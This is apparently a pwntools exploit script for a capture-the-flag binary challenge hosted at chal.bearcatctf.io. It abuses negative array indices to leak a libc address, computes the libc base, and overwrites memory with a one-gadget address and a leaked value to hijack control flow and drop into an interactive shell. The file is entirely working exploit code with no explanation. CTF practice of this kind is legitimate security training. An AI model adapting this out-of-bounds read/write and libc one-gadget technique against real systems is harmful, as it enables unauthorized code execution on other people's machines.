from pwn import *
from icecream import ic

exe = ELF("./main_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chal.bearcatctf.io", 42401)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''


'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()
ru(">")
sl('1')
ru(">")
sl('-26')
leak = rl().decode()
leak = int(leak.strip())
base = leak-290576
ru(">")
sl('1')
ru(">")
sl('-25')
leak2 = rl().decode()
leak2 = int(leak2.strip())
ic(leak2)
ic(leak)
ic(base)
ru(">")
sl('2')
ru(">")
sl('-36')
ru(">")
binsh = base + 0xe3b01
ic(binsh)
sl(str(binsh).encode())
ru(">")
sl('2')
ru(">")
sl('-35')
ru(">")
sl(str(leak2).encode())
# ru(">")
# sl('3')


i()
